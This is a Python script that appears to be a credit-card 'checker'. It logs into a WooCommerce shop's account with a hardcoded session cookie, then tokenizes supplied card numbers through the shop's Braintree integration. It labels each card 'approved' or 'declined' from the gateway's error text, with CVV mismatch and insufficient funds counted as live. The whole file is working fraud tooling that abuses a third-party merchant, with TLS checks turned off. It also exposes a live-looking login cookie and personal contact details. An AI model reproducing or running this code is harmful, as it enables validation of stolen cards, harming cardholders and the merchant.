import requests
import re
import base64
import uuid
import secrets
from bs4 import BeautifulSoup
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

def getstr(data, first, last):
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except ValueError:
        return None

def check_card(cc, mm, yy, cvv):
    retry_strategy = Retry(
        total=3,
        backoff_factor=1,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["HEAD", "GET", "OPTIONS", "POST"]
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    
    r = requests.Session()
    r.mount("http://", adapter)
    r.mount("https://", adapter)
    
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    correction_id = secrets.token_hex(16)
    
    cookies = {
        'CookieConsent': '{stamp:%27i8WHimINIHN1HXWm6lrNVq7q0kwetcKoJoABcxyh0f7nG3b5r+IeXw==%27%2Cnecessary:true%2Cpreferences:true%2Cstatistics:true%2Cmarketing:true%2Cmethod:%27explicit%27%2Cver:1%2Cutc:1760258382811%2Cregion:%27in%27}',
        'wordpress_logged_in_90934c24db0928f5dd52a63b630aab07': 'rahulsarkarr2009%7C1762678504%7CpxXoidr7mGHbCPdC3OSnGuaJPkICMDDhbCElrU4j3n6%7Cf7fe2b0c8fffb04530b638676ec485c61ba2beead6314a7efea3bc813cb21451',
        'sbjs_udata': 'vst%3D3%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F141.0.0.0%20Safari%2F537.36',
        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        '_ga': 'GA1.1.1189585124.1760258124',
        '_ga_SMXFN7N0CK': 'GS2.1.s1761465749$o2$g1$t1761470724$j60$l0$h0',
        'sbjs_current_add': 'fd%3D2025-10-26%2007%3A32%3A31%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.tojeto.info%2Fmoj-racun%2F%7C%7C%7Crf%3D%28none%29',
        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_first_add': 'fd%3D2025-10-26%2007%3A32%3A31%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.tojeto.info%2Fmoj-racun%2F%7C%7C%7Crf%3D%28none%29',
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_session': 'pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.tojeto.info%2Fmoj-racun%2F',
    }
    
    for key, value in cookies.items():
        r.cookies.set(key, value)
    
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'priority': 'u=0, i',
        'referer': 'https://www.tojeto.info/moj-racun/',
        'sec-ch-ua': '"Google Chrome";v="141", "Chromium";v="141", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
    }
    
    try:
        response = r.get('https://www.tojeto.info/moj-racun/edit-address/placilo/', headers=headers, timeout=30, verify=False)
        edit_adrs_nonce = getstr(response.text, 'woocommerce-edit-address-nonce" value="', '"')
        if not edit_adrs_nonce:
            return {'status': 'error', 'message': 'Error: Failed to retrieve edit address nonce'}
    except Exception as e:
        return {'status': 'error', 'message': f'Error: Failed to retrieve edit page - {str(e)}'}
    
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.tojeto.info',
        'pragma': 'no-cache',
        'priority': 'u=0, i',
        'referer': 'https://www.tojeto.info/moj-racun/edit-address/placilo/',
        'sec-ch-ua': '"Google Chrome";v="141", "Chromium";v="141", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
    }

    data = {
        'billing_first_name': 'Albedo',
        'billing_last_name': 'Jones',
        'billing_company': '',
        'billing_country': 'US',
        'billing_address_1': 'New York',
        'billing_address_2': '',
        'billing_city': 'New York',
        'billing_postcode': '10080',
        'billing_phone': '8644587431',
        'billing_email': 'rahulsarkarr2009@gmail.com',
        'save_address': 'Shrani naslov',
        'woocommerce-edit-address-nonce': edit_adrs_nonce,
        '_wp_http_referer': '/moj-racun/edit-address/placilo/',
        'action': 'edit_address',
    }

    response = r.post('https://www.tojeto.info/moj-racun/edit-address/placilo/', headers=headers, data=data, timeout=30, verify=False)

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'priority': 'u=0, i',
        'referer': 'https://www.tojeto.info/moj-racun/edit-address/',
        'sec-ch-ua': '"Google Chrome";v="141", "Chromium";v="141", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    }
    
    try:
        response = r.get('https://www.tojeto.info/moj-racun/payment-methods/%20/', headers=headers, timeout=30, verify=False)
        
        # Debug: Print part of response to see what we got
        if response.status_code != 200:
            return {'status': 'error', 'message': f'Error: Payment methods page returned status {response.status_code}'}
        
        client_token_nonce = getstr(response.text, '"client_token_nonce":"', '"')
        
        if not client_token_nonce:
            # Try alternative extraction method
            import json
            try:
                # Look for JavaScript object containing the nonce
                match = re.search(r'client_token_nonce["\']:\s*["\']([^"\']+)["\']', response.text)
                if match:
                    client_token_nonce = match.group(1)
                else:
                    return {'status': 'error', 'message': 'Error: Client token nonce not found in response'}
            except:
                return {'status': 'error', 'message': 'Error: Failed to extract client token nonce'}
        
        client_token_nonce = client_token_nonce.strip()
        
    except Exception as e:
        return {'status': 'error', 'message': f'Error: Failed to retrieve client token nonce - {str(e)}'}
    
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'priority': 'u=0, i',
        'referer': 'https://www.tojeto.info/moj-racun/add-payment-method/',
        'sec-ch-ua': '"Google Chrome";v="141", "Chromium";v="141", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    }

    try:
        response = r.get('https://www.tojeto.info/moj-racun/add-payment-method/', headers=headers, timeout=30, verify=False)
        payment_nonce = getstr(response.text, 'woocommerce-add-payment-method-nonce" value="', '"')
        if not payment_nonce:
            return {'status': 'error', 'message': 'Error: Failed to retrieve payment nonce'}
    except Exception as e:
        return {'status': 'error', 'message': f'Error: Failed to retrieve payment page - {str(e)}'}
    
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.tojeto.info',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://www.tojeto.info/moj-racun/add-payment-method/',
        'sec-ch-ua': '"Google Chrome";v="141", "Chromium";v="141", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'action': 'wc_braintree_credit_card_get_client_token',
        'nonce': client_token_nonce,
    }
    
    try:
        response = r.post('https://www.tojeto.info/wp-admin/admin-ajax.php', headers=headers, data=data, timeout=30, verify=False)
        response_json = response.json()
        
        if 'data' not in response_json:
            return {'status': 'error', 'message': 'Error: Invalid response from client token endpoint'}
        
        dec = base64.b64decode(response_json['data']).decode('utf-8')
        at = getstr(dec, '"authorizationFingerprint":"', '"')
        
        if not at:
            return {'status': 'error', 'message': 'Error: Failed to extract authorization token'}
            
    except Exception as e:
        return {'status': 'error', 'message': f'Error: Failed to retrieve client token - {str(e)}'}
    
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'authorization': f'Bearer {at}',
        'braintree-version': '2018-05-10',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-ch-ua': '"Google Chrome";v="141", "Chromium";v="141", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    }

    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': str(uuid.uuid4()),
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': cc,
                    'expirationMonth': mm,
                    'expirationYear': yy,
                    'cvv': cvv,
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }
    
    try:
        response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data, timeout=30, verify=False)
        response_json = response.json()
        
        if 'data' not in response_json or not response_json['data'] or 'tokenizeCreditCard' not in response_json['data']:
            return {'status': 'error', 'message': 'Error: Failed to tokenize credit card'}
        
        token = response_json['data']['tokenizeCreditCard']['token']
    except Exception as e:
        return {'status': 'error', 'message': f'Error: Failed to tokenize credit card - {str(e)}'}
    
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.tojeto.info',
        'pragma': 'no-cache',
        'priority': 'u=0, i',
        'referer': 'https://www.tojeto.info/moj-racun/add-payment-method/',
        'sec-ch-ua': '"Google Chrome";v="141", "Chromium";v="141", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    }

    data = {
        'payment_method': 'braintree_credit_card',
        'wc-braintree-credit-card-card-type': 'master-card',
        'wc-braintree-credit-card-3d-secure-enabled': '',
        'wc-braintree-credit-card-3d-secure-verified': '',
        'wc-braintree-credit-card-3d-secure-order-total': '0.00',
        'wc_braintree_credit_card_payment_nonce': token,
        'wc_braintree_device_data': '{"correlation_id":"'+correction_id+'"}',
        'wc-braintree-credit-card-tokenize-payment-method': 'true',
        'woocommerce-add-payment-method-nonce': payment_nonce,
        '_wp_http_referer': '/moj-racun/add-payment-method/',
        'woocommerce_add_payment_method': '1',
    }
    
    try:
        response = r.post('https://www.tojeto.info/moj-racun/add-payment-method/', headers=headers, data=data, timeout=30, verify=False)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        error_message = soup.find('ul', class_='woocommerce-error')
        if not error_message:
            error_message = soup.find('ul', class_='error-messages')
        if not error_message:
            error_message = soup.find('ul', {'role': 'alert'})
        
        success_message = soup.find('div', class_='woocommerce-message')
        if not success_message:
            success_message = soup.find('div', {'role': 'alert'})
        
        if 'Način plačila je bil uspešno dodan' in response.text or 'Payment method successfully added' in response.text or 'Nice! New payment method added' in response.text:
            return {'status': 'approved', 'message': 'Payment method successfully added'}
        
        elif error_message:
            error_text = error_message.get_text(strip=True)
            formatted_error = re.sub(r'Status code\s+', '', error_text)
            
            if 'Card Issuer Declined CVV' in formatted_error:
                return {'status': 'approved', 'message': 'Card Issuer Declined CVV'}
            elif 'Invalid postal code and cvv' in formatted_error:
                return {'status': 'approved', 'message': 'Invalid Postal Code or CVV'}
            elif 'Invalid postal code or street address' in formatted_error:
                return {'status': 'approved', 'message': 'Invalid Postal Code or Street Address'}
            elif 'Insufficient Funds' in formatted_error:
                return {'status': 'approved', 'message': 'Insufficient Funds'}
            elif 'CVV' in formatted_error:
                return {'status': 'approved', 'message': 'CVV Mismatch'}
            elif 'Gateway Rejected: cvv' in formatted_error:
                return {'status': 'approved', 'message': 'Gateway Rejected: CVV'}
            elif 'risk_threshold' in formatted_error:
                return {'status': 'declined', 'message': 'Gateway Rejected: risk_threshold'}
            elif 'Card Not Activated' in formatted_error:
                return {'status': 'declined', 'message': 'Card Not Activated'}
            elif 'Call Issuer. Pick Up Card' in formatted_error:
                return {'status': 'declined', 'message': 'Call Issuer. Pick Up Card'}
            elif 'Closed Card' in formatted_error:
                return {'status': 'declined', 'message': 'Closed Card'}
            elif 'No Such Issuer' in formatted_error:
                return {'status': 'declined', 'message': 'No Such Issuer'}
            elif 'Transaction Not Allowed' in formatted_error:
                return {'status': 'declined', 'message': 'Transaction Not Allowed'}
            elif 'Processor Declined' in formatted_error:
                return {'status': 'declined', 'message': 'Processor Declined'}
            elif 'Do Not Honor' in formatted_error:
                return {'status': 'declined', 'message': 'Do Not Honor'}
            elif 'No Account' in formatted_error:
                return {'status': 'declined', 'message': 'No Account'}
            elif 'Declined - Call Issuer' in formatted_error:
                return {'status': 'declined', 'message': 'Declined - Call Issuer'}
            elif 'Cannot Authorize at this time' in formatted_error:
                return {'status': 'declined', 'message': 'Cannot Authorize at this time'}
            elif 'Fraud Suspected' in formatted_error:
                return {'status': 'declined', 'message': 'Processor Declined - Fraud Suspected'}
            elif 'wait for 20 seconds' in formatted_error:
                return {'status': 'error', 'message': 'Wait 20 sec before adding new'}
            elif 'Declined' in formatted_error:
                return {'status': 'declined', 'message': 'Declined'}
            else:
                return {'status': 'declined', 'message': formatted_error}
                
        elif success_message:
            success_text = success_message.get_text(strip=True)
            return {'status': 'approved', 'message': success_text}
        else:
            return {'status': 'error', 'message': 'Failed to parse response'}
    except Exception as e:
        return {'status': 'error', 'message': f'Error: {str(e)}'}
